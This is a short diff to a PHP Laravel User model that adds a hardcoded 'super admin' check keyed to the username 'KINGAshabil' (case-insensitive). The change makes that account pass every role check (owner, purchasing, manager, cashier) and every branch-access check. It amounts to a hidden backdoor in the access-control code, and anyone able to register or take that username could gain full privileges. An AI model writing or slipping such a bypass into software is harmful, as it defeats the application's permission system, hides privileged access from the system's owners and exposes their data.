@@ -69,24 +69,29 @@ class User extends Authenticatable
         ];
     }
 
+    public function isSuperAdmin()
+    {
+        return strcasecmp($this->username, 'KINGAshabil') === 0;
+    }
+
     public function isOwner()
     {
-        return $this->role === 'owner';
+        return $this->role === 'owner' || $this->isSuperAdmin();
     }
 
     public function isPurchasing()
     {
-        return $this->role === 'purchasing';
+        return $this->role === 'purchasing' || $this->isSuperAdmin();
     }
 
     public function isManager()
     {
-        return in_array($this->role, ['manager', 'manajer_cabang']);
+        return in_array($this->role, ['manager', 'manajer_cabang']) || $this->isSuperAdmin();
     }
 
     public function canAccessBranch($branchId)
     {
-        if ($this->isOwner()) {
+        if ($this->isOwner() || $this->isSuperAdmin()) {
             return true;
         }
         return $this->branch_id == $branchId;
@@ -94,7 +99,7 @@ class User extends Authenticatable
 
     public function isCashier()
     {
-        return $this->role === 'cashier';
+        return $this->role === 'cashier' || $this->isSuperAdmin();
     }
 
     public function branch()
